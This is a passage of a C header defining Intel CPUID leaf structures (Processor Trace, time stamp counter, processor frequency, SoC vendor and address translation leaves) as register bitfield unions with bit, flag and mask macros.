             * Trace packet generation.
             */
            UINT32 Flag5 : 1;
#define CPUID_EBX_FLAG5_BIT                                          5
#define CPUID_EBX_FLAG5_FLAG                                         0x20
#define CPUID_EBX_FLAG5_MASK                                         0x01
#define CPUID_EBX_FLAG5(_)                                           (((_) >> 5) & 0x01)
            UINT32 Reserved1 : 26;
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bit 0] If 1, Tracing can be enabled with IA32_RTIT_CTL.ToPA = 1, hence utilizing the ToPA output scheme;
             * IA32_RTIT_OUTPUT_BASE and IA32_RTIT_OUTPUT_MASK_PTRS MSRs can be accessed.
             */
            UINT32 Flag0 : 1;
#define CPUID_ECX_FLAG0_BIT                                          0
#define CPUID_ECX_FLAG0_FLAG                                         0x01
#define CPUID_ECX_FLAG0_MASK                                         0x01
#define CPUID_ECX_FLAG0(_)                                           (((_) >> 0) & 0x01)

            /**
             * [Bit 1] If 1, ToPA tables can hold any number of output entries, up to the maximum allowed by the MaskOrTableOffset
             * field of IA32_RTIT_OUTPUT_MASK_PTRS.
             */
            UINT32 Flag1 : 1;
#define CPUID_ECX_FLAG1_BIT                                          1
#define CPUID_ECX_FLAG1_FLAG                                         0x02
#define CPUID_ECX_FLAG1_MASK                                         0x01
#define CPUID_ECX_FLAG1(_)                                           (((_) >> 1) & 0x01)

            /**
             * [Bit 2] If 1, indicates support of Single-Range Output scheme.
             */
            UINT32 Flag2 : 1;
#define CPUID_ECX_FLAG2_BIT                                          2
#define CPUID_ECX_FLAG2_FLAG                                         0x04
#define CPUID_ECX_FLAG2_MASK                                         0x01
#define CPUID_ECX_FLAG2(_)                                           (((_) >> 2) & 0x01)

            /**
             * [Bit 3] If 1, indicates support of output to Trace Transport subsystem.
             */
            UINT32 Flag3 : 1;
#define CPUID_ECX_FLAG3_BIT                                          3
#define CPUID_ECX_FLAG3_FLAG                                         0x08
#define CPUID_ECX_FLAG3_MASK                                         0x01
#define CPUID_ECX_FLAG3(_)                                           (((_) >> 3) & 0x01)
            UINT32 Reserved1 : 27;

            /**
             * [Bit 31] If 1, generated packets which contain IP payloads have LIP values, which include the CS base component.
             */
            UINT32 Flag31 : 1;
#define CPUID_ECX_FLAG31_BIT                                         31
#define CPUID_ECX_FLAG31_FLAG                                        0x80000000
#define CPUID_ECX_FLAG31_MASK                                        0x01
#define CPUID_ECX_FLAG31(_)                                          (((_) >> 31) & 0x01)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_14_ECX_00;

/**
 * @brief Intel Processor Trace Enumeration Sub-leaf (EAX = 14H, ECX = 1)
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 2:0] Number of configurable Address Ranges for filtering.
             */
            UINT32 NumberOfConfigurableAddressRangesForFiltering : 3;
#define CPUID_EAX_NUMBER_OF_CONFIGURABLE_ADDRESS_RANGES_FOR_FILTERING_BIT 0
#define CPUID_EAX_NUMBER_OF_CONFIGURABLE_ADDRESS_RANGES_FOR_FILTERING_FLAG 0x07
#define CPUID_EAX_NUMBER_OF_CONFIGURABLE_ADDRESS_RANGES_FOR_FILTERING_MASK 0x07
#define CPUID_EAX_NUMBER_OF_CONFIGURABLE_ADDRESS_RANGES_FOR_FILTERING(_) (((_) >> 0) & 0x07)
            UINT32 Reserved1 : 13;

            /**
             * [Bits 31:16] Bitmap of supported MTC period encodings.
             */
            UINT32 BitmapOfSupportedMtcPeriodEncodings : 16;
#define CPUID_EAX_BITMAP_OF_SUPPORTED_MTC_PERIOD_ENCODINGS_BIT       16
#define CPUID_EAX_BITMAP_OF_SUPPORTED_MTC_PERIOD_ENCODINGS_FLAG      0xFFFF0000
#define CPUID_EAX_BITMAP_OF_SUPPORTED_MTC_PERIOD_ENCODINGS_MASK      0xFFFF
#define CPUID_EAX_BITMAP_OF_SUPPORTED_MTC_PERIOD_ENCODINGS(_)        (((_) >> 16) & 0xFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 15:0] Bitmap of supported Cycle Threshold value encodings.
             */
            UINT32 BitmapOfSupportedCycleThresholdValueEncodings : 16;
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CYCLE_THRESHOLD_VALUE_ENCODINGS_BIT 0
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CYCLE_THRESHOLD_VALUE_ENCODINGS_FLAG 0xFFFF
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CYCLE_THRESHOLD_VALUE_ENCODINGS_MASK 0xFFFF
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CYCLE_THRESHOLD_VALUE_ENCODINGS(_) (((_) >> 0) & 0xFFFF)

            /**
             * [Bits 31:16] Bitmap of supported Configurable PSB frequency encodings.
             */
            UINT32 BitmapOfSupportedConfigurablePsbFrequencyEncodings : 16;
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CONFIGURABLE_PSB_FREQUENCY_ENCODINGS_BIT 16
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CONFIGURABLE_PSB_FREQUENCY_ENCODINGS_FLAG 0xFFFF0000
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CONFIGURABLE_PSB_FREQUENCY_ENCODINGS_MASK 0xFFFF
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CONFIGURABLE_PSB_FREQUENCY_ENCODINGS(_) (((_) >> 16) & 0xFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_14_ECX_01;

/**
 * @}
 */


 /**
  * @brief Stamp Counter and Nominal Core Crystal Clock Information Leaf
  *
  * When CPUID executes with EAX set to 15H and ECX = 0H, the processor returns information about Time Stamp Counter and
  * Core Crystal Clock.
  *
  * @note If EBX[31:0] is 0, the TSC/"core crystal clock" ratio is not enumerated. EBX[31:0]/EAX[31:0] indicates the ratio
  *       of the TSC frequency and the core crystal clock frequency.
  *       If ECX is 0, the nominal core crystal clock frequency is not enumerated. "TSC frequency" = "core crystal clock
  *       frequency" * EBX/EAX.
  */
#define CPUID_TIME_STAMP_COUNTER_INFORMATION                         0x00000015
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] An unsigned integer which is the denominator of the TSC/"core crystal clock" ratio.
             */
            UINT32 Denominator : 32;
#define CPUID_EAX_DENOMINATOR_BIT                                    0
#define CPUID_EAX_DENOMINATOR_FLAG                                   0xFFFFFFFF
#define CPUID_EAX_DENOMINATOR_MASK                                   0xFFFFFFFF
#define CPUID_EAX_DENOMINATOR(_)                                     (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] An unsigned integer which is the numerator of the TSC/"core crystal clock" ratio.
             */
            UINT32 Numerator : 32;
#define CPUID_EBX_NUMERATOR_BIT                                      0
#define CPUID_EBX_NUMERATOR_FLAG                                     0xFFFFFFFF
#define CPUID_EBX_NUMERATOR_MASK                                     0xFFFFFFFF
#define CPUID_EBX_NUMERATOR(_)                                       (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] An unsigned integer which is the nominal frequency of the core crystal clock in Hz.
             */
            UINT32 NominalFrequency : 32;
#define CPUID_ECX_NOMINAL_FREQUENCY_BIT                              0
#define CPUID_ECX_NOMINAL_FREQUENCY_FLAG                             0xFFFFFFFF
#define CPUID_ECX_NOMINAL_FREQUENCY_MASK                             0xFFFFFFFF
#define CPUID_ECX_NOMINAL_FREQUENCY(_)                               (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_15;


/**
 * @brief Processor Frequency Information Leaf
 *
 * When CPUID executes with EAX set to 16H, the processor returns information about Processor Frequency Information.
 *
 * @note Data is returned from this interface in accordance with the processor's specification and does not reflect actual
 *       values. Suitable use of this data includes the display of processor information in like manner to the processor brand
 *       string and for determining the appropriate range to use when displaying processor information e.g. frequency history
 *       graphs. The returned information should not be used for any other purpose as the returned information does not
 *       accurately correlate to information / counters returned by other processor interfaces.
 *       While a processor may support the Processor Frequency Information leaf, fields that return a value of zero are not
 *       supported.
 */
#define CPUID_PROCESSOR_FREQUENCY_INFORMATION                        0x00000016
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 15:0] Processor Base Frequency (in MHz).
             */
            UINT32 ProcesorBaseFrequencyMhz : 16;
#define CPUID_EAX_PROCESOR_BASE_FREQUENCY_MHZ_BIT                    0
#define CPUID_EAX_PROCESOR_BASE_FREQUENCY_MHZ_FLAG                   0xFFFF
#define CPUID_EAX_PROCESOR_BASE_FREQUENCY_MHZ_MASK                   0xFFFF
#define CPUID_EAX_PROCESOR_BASE_FREQUENCY_MHZ(_)                     (((_) >> 0) & 0xFFFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 15:0] Maximum Frequency (in MHz).
             */
            UINT32 ProcessorMaximumFrequencyMhz : 16;
#define CPUID_EBX_PROCESSOR_MAXIMUM_FREQUENCY_MHZ_BIT                0
#define CPUID_EBX_PROCESSOR_MAXIMUM_FREQUENCY_MHZ_FLAG               0xFFFF
#define CPUID_EBX_PROCESSOR_MAXIMUM_FREQUENCY_MHZ_MASK               0xFFFF
#define CPUID_EBX_PROCESSOR_MAXIMUM_FREQUENCY_MHZ(_)                 (((_) >> 0) & 0xFFFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 15:0] Bus (Reference) Frequency (in MHz).
             */
            UINT32 BusFrequencyMhz : 16;
#define CPUID_ECX_BUS_FREQUENCY_MHZ_BIT                              0
#define CPUID_ECX_BUS_FREQUENCY_MHZ_FLAG                             0xFFFF
#define CPUID_ECX_BUS_FREQUENCY_MHZ_MASK                             0xFFFF
#define CPUID_ECX_BUS_FREQUENCY_MHZ(_)                               (((_) >> 0) & 0xFFFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_16;

/**
 * @defgroup CPUID_EAX_17 \
 *           EAX = 0x17
 *
 * When CPUID executes with EAX set to 17H, the processor returns information about the System-On-Chip Vendor Attribute
 * Enumeration.
 * @{
 */
#define CPUID_SOC_VENDOR_INFORMATION                                 0x00000017
 /**
  * @brief System-On-Chip Vendor Attribute Enumeration Main Leaf (EAX = 17H, ECX = 0)
  *
  * @note Leaf 17H main leaf (ECX = 0). Leaf 17H output depends on the initial value in ECX. Leaf 17H sub-leaves 1 through 3
  *       reports SOC Vendor Brand String. Leaf 17H is valid if MaxSOCID_Index >= 3. Leaf 17H sub-leaves 4 and above are reserved.
  */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reports the maximum input value of supported sub-leaf in leaf 17H.
             */
            UINT32 MaxSocIdIndex : 32;
#define CPUID_EAX_MAX_SOC_ID_INDEX_BIT                               0
#define CPUID_EAX_MAX_SOC_ID_INDEX_FLAG                              0xFFFFFFFF
#define CPUID_EAX_MAX_SOC_ID_INDEX_MASK                              0xFFFFFFFF
#define CPUID_EAX_MAX_SOC_ID_INDEX(_)                                (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 15:0] SOC Vendor ID.
             */
            UINT32 SocVendorId : 16;
#define CPUID_EBX_SOC_VENDOR_ID_BIT                                  0
#define CPUID_EBX_SOC_VENDOR_ID_FLAG                                 0xFFFF
#define CPUID_EBX_SOC_VENDOR_ID_MASK                                 0xFFFF
#define CPUID_EBX_SOC_VENDOR_ID(_)                                   (((_) >> 0) & 0xFFFF)

            /**
             * [Bit 16] If 1, the SOC Vendor ID field is assigned via an industry standard enumeration scheme. Otherwise, the SOC
             * Vendor ID field is assigned by Intel.
             */
            UINT32 IsVendorScheme : 1;
#define CPUID_EBX_IS_VENDOR_SCHEME_BIT                               16
#define CPUID_EBX_IS_VENDOR_SCHEME_FLAG                              0x10000
#define CPUID_EBX_IS_VENDOR_SCHEME_MASK                              0x01
#define CPUID_EBX_IS_VENDOR_SCHEME(_)                                (((_) >> 16) & 0x01)
            UINT32 Reserved1 : 15;
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] A unique number an SOC vendor assigns to its SOC projects.
             */
            UINT32 ProjectId : 32;
#define CPUID_ECX_PROJECT_ID_BIT                                     0
#define CPUID_ECX_PROJECT_ID_FLAG                                    0xFFFFFFFF
#define CPUID_ECX_PROJECT_ID_MASK                                    0xFFFFFFFF
#define CPUID_ECX_PROJECT_ID(_)                                      (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] A unique number within an SOC project that an SOC vendor assigns.
             */
            UINT32 SteppingId : 32;
#define CPUID_EDX_STEPPING_ID_BIT                                    0
#define CPUID_EDX_STEPPING_ID_FLAG                                   0xFFFFFFFF
#define CPUID_EDX_STEPPING_ID_MASK                                   0xFFFFFFFF
#define CPUID_EDX_STEPPING_ID(_)                                     (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_17_ECX_00;

/**
 * @brief System-On-Chip Vendor Attribute Enumeration Sub-leaf (EAX = 17H, ECX = 1..3)
 *
 * @note Leaf 17H output depends on the initial value in ECX. SOC Vendor Brand String is a UTF-8 encoded string padded with
 *       trailing bytes of 00H. The complete SOC Vendor Brand String is constructed by concatenating in ascending order of
 *       EAX:EBX:ECX:EDX and from the sub-leaf 1 fragment towards sub-leaf 3.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] SOC Vendor Brand String. UTF-8 encoded string.
             */
            UINT32 SocVendorBrandString : 32;
#define CPUID_EAX_SOC_VENDOR_BRAND_STRING_BIT                        0
#define CPUID_EAX_SOC_VENDOR_BRAND_STRING_FLAG                       0xFFFFFFFF
#define CPUID_EAX_SOC_VENDOR_BRAND_STRING_MASK                       0xFFFFFFFF
#define CPUID_EAX_SOC_VENDOR_BRAND_STRING(_)                         (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] SOC Vendor Brand String. UTF-8 encoded string.
             */
            UINT32 SocVendorBrandString : 32;
#define CPUID_EBX_SOC_VENDOR_BRAND_STRING_BIT                        0
#define CPUID_EBX_SOC_VENDOR_BRAND_STRING_FLAG                       0xFFFFFFFF
#define CPUID_EBX_SOC_VENDOR_BRAND_STRING_MASK                       0xFFFFFFFF
#define CPUID_EBX_SOC_VENDOR_BRAND_STRING(_)                         (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] SOC Vendor Brand String. UTF-8 encoded string.
             */
            UINT32 SocVendorBrandString : 32;
#define CPUID_ECX_SOC_VENDOR_BRAND_STRING_BIT                        0
#define CPUID_ECX_SOC_VENDOR_BRAND_STRING_FLAG                       0xFFFFFFFF
#define CPUID_ECX_SOC_VENDOR_BRAND_STRING_MASK                       0xFFFFFFFF
#define CPUID_ECX_SOC_VENDOR_BRAND_STRING(_)                         (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] SOC Vendor Brand String. UTF-8 encoded string.
             */
            UINT32 SocVendorBrandString : 32;
#define CPUID_EDX_SOC_VENDOR_BRAND_STRING_BIT                        0
#define CPUID_EDX_SOC_VENDOR_BRAND_STRING_FLAG                       0xFFFFFFFF
#define CPUID_EDX_SOC_VENDOR_BRAND_STRING_MASK                       0xFFFFFFFF
#define CPUID_EDX_SOC_VENDOR_BRAND_STRING(_)                         (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_17_ECX_01_03;

/**
 * @brief System-On-Chip Vendor Attribute Enumeration Sub-leaves (EAX = 17H, ECX > MaxSOCID_Index)
 *
 * @note Leaf 17H output depends on the initial value in ECX.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reserved = 0.
             */
            UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT                                       0
#define CPUID_EAX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reserved = 0.
             */
            UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT                                       0
#define CPUID_EBX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reserved = 0.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reserved = 0.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_17_ECX_N;

/**
 * @}
 */

 /**
  * @defgroup CPUID_EAX_18 \
  *           EAX = 0x18
  *
  * When CPUID executes with EAX set to 18H, the processor returns information about the Deterministic Address Translation
  * Parameters.
  * @{
  */
#define CPUID_DETERMINISTIC_ADDRESS_TRANSLATION_PARAMETERS           0x00000018
  /**
   * @brief Deterministic Address Translation Parameters Main Leaf (EAX = 18H, ECX = 0)
   *
   * @note Each sub-leaf enumerates a different address translation structure.
   *       If ECX contains an invalid sub-leaf index, EAX/EBX/ECX/EDX return 0. Sub-leaf index n is invalid if n exceeds the value
   *       that sub-leaf 0 returns in EAX. A sub-leaf index is also invalid if EDX[4:0] returns 0. Valid sub-leaves do not need to
   *       be contiguous or in any particular order. A valid sub-leaf may be in a higher input ECX value than an invalid sub-leaf
   *       or than a valid sub-leaf of a higher or lower-level structure.
   */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reports the maximum input value of supported sub-leaf in leaf 18H.
             */
            UINT32 MaxSubLeaf : 32;
#define CPUID_EAX_MAX_SUB_LEAF_BIT                                   0
#define CPUID_EAX_MAX_SUB_LEAF_FLAG                                  0xFFFFFFFF
#define CPUID_EAX_MAX_SUB_LEAF_MASK                                  0xFFFFFFFF
#define CPUID_EAX_MAX_SUB_LEAF(_)                                    (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bit 0] 4K page size entries supported by this structure.
             */
            UINT32 PageEntries4KbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_BIT                     0
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_FLAG                    0x01
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_MASK                    0x01
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED(_)                      (((_) >> 0) & 0x01)

            /**
             * [Bit 1] 2MB page size entries supported by this structure.
             */
            UINT32 PageEntries2MbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_BIT                     1
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_FLAG                    0x02
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_MASK                    0x01
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED(_)                      (((_) >> 1) & 0x01)

            /**
             * [Bit 2] 4MB page size entries supported by this structure.
             */
            UINT32 PageEntries4MbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_BIT                     2
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_FLAG                    0x04
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_MASK                    0x01
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED(_)                      (((_) >> 2) & 0x01)

            /**
             * [Bit 3] 1 GB page size entries supported by this structure.
             */
            UINT32 PageEntries1GbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_BIT                     3
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_FLAG                    0x08
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_MASK                    0x01
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED(_)                      (((_) >> 3) & 0x01)
            UINT32 Reserved1 : 4;

            /**
             * [Bits 10:8] Partitioning (0: Soft partitioning between the logical processors sharing this structure).
             */
            UINT32 Partitioning : 3;
#define CPUID_EBX_PARTITIONING_BIT                                   8
#define CPUID_EBX_PARTITIONING_FLAG                                  0x700
#define CPUID_EBX_PARTITIONING_MASK                                  0x07
#define CPUID_EBX_PARTITIONING(_)                                    (((_) >> 8) & 0x07)
            UINT32 Reserved2 : 5;

            /**
             * [Bits 31:16] W = Ways of associativity.
             */
            UINT32 WaysOfAssociativity00 : 16;
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_00_BIT                       16
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_00_FLAG                      0xFFFF0000
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_00_MASK                      0xFFFF
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_00(_)                        (((_) >> 16) & 0xFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Number of Sets.
             */
            UINT32 NumberOfSets : 32;
#define CPUID_ECX_NUMBER_OF_SETS_BIT                                 0
#define CPUID_ECX_NUMBER_OF_SETS_FLAG                                0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS_MASK                                0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS(_)                                  (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 4:0] Translation cache type field.
             * - 00000b: Null (indicates this sub-leaf is not valid).
             * - 00001b: Data TLB.
             * - 00010b: Instruction TLB.
             * - 00011b: Unified TLB.
             * All other encodings are reserved.
             *
             * @note Some unified TLBs will allow a single TLB entry to satisfy data read/write and instruction fetches. Others will
             *       require separate entries (e.g., one loaded on data read/write and another loaded on an instruction fetch) . Please see
             *       the Intel(R) 64 and IA-32 Architectures Optimization Reference Manual for details of a particular product.
             */
            UINT32 TranslationCacheTypeField : 5;
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_BIT                   0
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_FLAG                  0x1F
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_MASK                  0x1F
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD(_)                    (((_) >> 0) & 0x1F)

            /**
             * [Bits 7:5] Translation cache level (starts at 1).
             */
            UINT32 TranslationCacheLevel : 3;
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_BIT                        5
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_FLAG                       0xE0
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_MASK                       0x07
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL(_)                         (((_) >> 5) & 0x07)

            /**
             * [Bit 8] Fully associative structure.
             */
            UINT32 FullyAssociativeStructure : 1;
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_BIT                    8
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_FLAG                   0x100
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_MASK                   0x01
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE(_)                     (((_) >> 8) & 0x01)
            UINT32 Reserved1 : 5;

            /**
             * [Bits 25:14] Maximum number of addressable IDs for logical processors sharing this translation cache.
             *
             * @note Add one to the return value to get the result.
             */
            UINT32 MaxAddressableIdsForLogicalProcessors : 12;
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_BIT     14
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_FLAG    0x3FFC000
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_MASK    0xFFF
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS(_)      (((_) >> 14) & 0xFFF)
            UINT32 Reserved2 : 6;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_18_ECX_00;

/**
 * @brief Deterministic Address Translation Parameters Sub-leaf (EAX = 18H, ECX >= 1)
 *
 * @note Each sub-leaf enumerates a different address translation structure.
 *       If ECX contains an invalid sub-leaf index, EAX/EBX/ECX/EDX return 0. Sub-leaf index n is invalid if n exceeds the value
 *       that sub-leaf 0 returns in EAX. A sub-leaf index is also invalid if EDX[4:0] returns 0. Valid sub-leaves do not need to
 *       be contiguous or in any particular order. A valid sub-leaf may be in a higher input ECX value than an invalid sub-leaf
 *       or than a valid sub-leaf of a higher or lower-level structure.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] EAX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT                                       0
#define CPUID_EAX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bit 0] 4K page size entries supported by this structure.
             */
            UINT32 PageEntries4KbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_BIT                     0
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_FLAG                    0x01
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_MASK                    0x01
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED(_)                      (((_) >> 0) & 0x01)

            /**
             * [Bit 1] 2MB page size entries supported by this structure.
             */
            UINT32 PageEntries2MbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_BIT                     1
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_FLAG                    0x02
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_MASK                    0x01
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED(_)                      (((_) >> 1) & 0x01)

            /**
             * [Bit 2] 4MB page size entries supported by this structure.
             */
            UINT32 PageEntries4MbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_BIT                     2
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_FLAG                    0x04
